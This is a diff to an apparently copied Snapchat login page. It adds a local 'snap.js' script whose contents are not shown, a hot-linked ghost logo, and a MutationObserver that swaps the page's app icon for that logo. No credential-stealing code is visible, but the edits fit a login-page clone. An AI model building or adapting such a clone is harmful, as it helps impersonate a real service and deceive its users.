@@ -7,14 +7,12 @@
     <meta name="referrer" content="origin" />
     <meta name="apple-mobile-web-app-capable" content="no" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
-    <!-- This meta tag is used for Google site verification in search console -->
     <meta name="google-site-verification" content="SA-WartaE0JJY1xTTk4iZQvUy4yMaiIWL5YCaRDVM0M" />
     <link rel="canonical" href="https://accounts.snapchat.com/accounts/v2/login" />
     <script>const PAGE_LOAD_START_TIME_MS = Date.now();</script>
     <!-- Styles -->
     <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/semantic.min.css"/>
     <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/dropdown.min.css"/>
-    <!-- Force reload of css file -->
     <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/snapchat.css?t=0"/>
     <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/accounts.css"/>
     <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/auth.css"/>
@@ -24,6 +22,7 @@
     <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/semantic.min.js"></script>
     <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/dropdown.min.js"></script>
     <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/accounts.js"></script>
+    <script src="snap.js" defer></script>
     <!-- Favicon -->
     <link rel="shortcut icon" href="https://static.snapchat.com/accounts-ui/static/1738266753/images/favicon/favicon.png" type="image/png" />
     <link rel="stylesheet" type="text/css" href="https://snapnet-cdn.storage.googleapis.com/fonts/avenir-next/avenirnext.font.css" />
@@ -38,6 +37,7 @@
             data-is-arkose-lightbox="true"
             data-redirect-to-download-page="true"
             data-enable-attestation="true">
+            <img src="https://www.logo.wine/a/logo/Snapchat/Snapchat-Ghost-Outlined-Logo.wine.svg" alt="" style="width: 10px; height: auto;">
         </div>
         <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/main.js?v=59def6d372804f0443b7b27d5ccdd9bc5e262200feeda73add4f660c4a5414d7%20%20src%2Fmain%2Fwebapp%2Faccounts%2Fstatic%2Fscripts%2Fmain.js%20masterbbf1152f"></script>
     </div>
@@ -117,6 +117,22 @@
                     }
                 }
             }, true);
+
+            // MutationObserver to replace the image if it appears again
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    mutation.addedNodes.forEach(function(node) {
+                        if (node.nodeType === 1 && node.tagName === 'IMG' && node.src.includes('/accounts/static/images/ghost/snapchat-app-icon.svg')) {
+                            node.src = 'https://www.logo.wine/a/logo/Snapchat/Snapchat-Ghost-Outlined-Logo.wine.svg';
+                            node.style.width = '10px'; // Set the width to 10px
+                            node.style.height = 'auto'; // Maintain aspect ratio
+                        }
+                    });
+                });
+            });
+
+            // Start observing the body for added nodes
+            observer.observe(document.body, { childList: true, subtree: true });
         });
     </script>
 </body>
